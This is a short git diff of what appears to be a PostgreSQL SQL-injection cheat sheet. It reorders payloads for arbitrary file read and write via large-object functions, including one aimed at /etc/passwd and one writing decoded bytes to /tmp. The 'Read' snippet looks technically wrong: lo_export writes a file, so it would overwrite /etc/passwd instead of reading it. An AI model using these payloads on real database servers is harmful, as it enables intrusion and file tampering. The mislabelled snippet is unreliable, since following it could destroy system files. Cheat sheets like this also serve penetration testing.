@@ -165,13 +165,13 @@ ts_stat('SELECT * FROM users')::text
 
 #### Arbitrary read / write
 ```
-# Write
-lo_from_bytea(31337, decode('bG9saXBvcAo=', 'base64'))
-lo_export(31337, '/tmp/lolipop')
-
 # Read
-lo_export(31338, '/etc/passwd')
-lo_get(31338)
+lo_export(31337, '/etc/passwd')
+lo_get(31337)
+
+# Write
+lo_from_bytea(31338, decode('bG9saXBvcAo=', 'base64'))
+lo_export(31338, '/tmp/lolipop')
 ```
 
 ## SQLmap
